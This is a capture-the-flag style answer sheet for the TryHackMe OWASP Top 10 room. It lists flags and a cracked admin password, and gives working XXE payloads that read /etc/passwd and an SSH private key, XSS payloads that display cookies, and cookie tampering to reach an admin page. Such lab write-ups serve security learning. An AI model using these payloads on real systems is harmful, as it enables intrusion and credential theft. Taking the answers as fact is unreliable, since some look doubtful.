# Notes for the room OWASP Top 10 (https://tryhackme.com/room/owasptop10). Part of the "Complete Beginner Path"

## Questions and answers:

### Task 5

What strange text file is in the website root directory?

- Just use the command `ls`

```
drpepper.txt
```

How many non-root/non-service/non-daemon users are there?

```
0
```

What user is this app running as?

- Check the user with `ps - ef`

```
www-data
```

What version of Ubuntu is running?

- Run the command `cat /etc/os-release`

```
18.04.4
```

Print out the MOTD.  What favorite beverage is shown?

- Run the command `cat /etc/update-motd.d/00-header`

```
dr. peper
```

### Task 7

What is the flag that you found in darren's account?

```
fe86079416a21a3c99937fea8874b667
```

What is the flag that you found in arthur's account?

```
d9ac0f7db4fda460ac3edeb75d75e16e
```

### Task 11

What is the name of the mentioned directory?

- Go to login page and view page source 

```
/assets
```

Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

```
webapp.db
```

Use the supporting material to access the sensitive data. What is the password hash of the admin user?

- `sq3lite webapp.db` --> `PRAGMA table_info(users);` --> `SELECT * FROM users;`

```
6eea9b7ef19179a06954edd0f6c05ceb
```

What is the admin's plaintext password?

```
qwertyuiop
```

Login as the admin. What is the flag?
```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

### Task 13

Full form of XML

```
eXtensible Markup Language
```

Is it compulsory to have XML prolog in XML documents?
```
No
```

Can we validate XML documents against a schema?
```
Yes
```

How can we specify XML version and encoding in XML document?

```
XML Prolog
```

### Task 14

How do you define a new ELEMENT?
```
!ELEMENT
```

How do you define a ROOT element?

```
!DOCTYPE
```

How do you define a new ENTITY?

```
!ENTITY
```

### Task 15

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file `/etc/passwd`.

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

### Task 16

Try to display your own name using any payload.

```
<!DOCTYPE replace [<!ENTITY name "mmjasen"> ]>
 <userInfo>
  <firstName>mmja</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

See if you can read the /etc/passwd

```
Check answer above
```

What is the name of the user in /etc/passwd
```
falcon
```

Where is falcon's SSH key located?
```
/home/falcon/.ssh/id_rsa
```

What are the first 18 characters for falcon's private key?

Command:

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa>]>
<root>&read;</root>
```
Result:
```
MIIEogIBAAKCAQEA7b
```

### Task 18

Look at other users notes. What is the flag?

Go to: 

```
IP/note.php?note=0
```
Output:
```
flag{fivefourthree} 
```

### Task 19

Hack into the webapp, and find the flag!

- Search for 'Pensive Notes' on google it will give you a github-page: https://github.com/NinjaJc01/PensiveNotes. In the README there is a default username:password

```
thm{4b9513968fd564a87b28aa1f9d672e17}
```

### Task 20

Navigate to http://MACHINEIP in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

Run command:

```
<script>alert(“Hello World”)</script>
```
Output:

```
ThereIsMoreToXSSThanYouThink
```

On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

Run command:

```
<script>alert(window.location.host)</script>
```

Output and answer:

```
ReflectiveXss4TheWin
```

Now navigate to http://MACHINEIP in your browser and click on the "Stored XSS" tab on the navbar; make an account.

Then add a comment and see if you can insert some of your own HTML.

Create simple button:

```
<html>
<body>
<h1>Button mmja</h1>
<button type="button" onclick="alert('Hello world!')">Click Me</button>
</body>
</html>
```

Insert and get output:

```
HTML_T4gs
```

On the same page, create an alert popup box appear on the page with your document cookies.

See here: https://www.w3schools.com/js/js_cookies.asp

Command:

```
<script>alert(document.cookie)</script>
```

Output and answer:

```
W3LL_D0N3_LVL2
```

Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

Check the hint

```
websites_can_be_easily_defaced_with_xss
```

### Task 21

Who developed the Tomcat application?

```
Apache Software Foundation
```

What type of attack that crashes services can be performed with insecure deserialization?

```
Denial of Service
```

### Task 22

Select the correct term of the following statement:


if a dog was sleeping, would this be:

A) A State
B) A Behaviour 

```
A Behaviour
```

### Task 23

What is the name of the base-2 formatting that data is sent across a network as? 

```
binary
```

### Task 24

If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

```
webapp.com/login
```

What is the acronym for the web technology that Secure cookies work over?

```
HTTPS
```

### Task 25

You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.

Modifying Cookie Values
Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.

This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?

Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://MACHINEIP/admin to answer the second flag.

1st flag (cookie value)

```
THM{good_old_base64_huh}
```

2nd flag (admin dashboard)

```
THM{heres_the_admin_flag}
```

### Task 26

If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!

flag.txt

```
4a69a7ff9fd68
```

### Task 29

Search for online book store on https://www.exploit-db.com/, then download the verified exploit. Run the code with http://MACHINEIP.

How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
```
1611
```

### Task 30

Put this knowledge to practise by analysing this sample log file.

What IP address is the attacker using?

```
49.99.13.16
```

What kind of attack is being carried out?

```
brute force
```

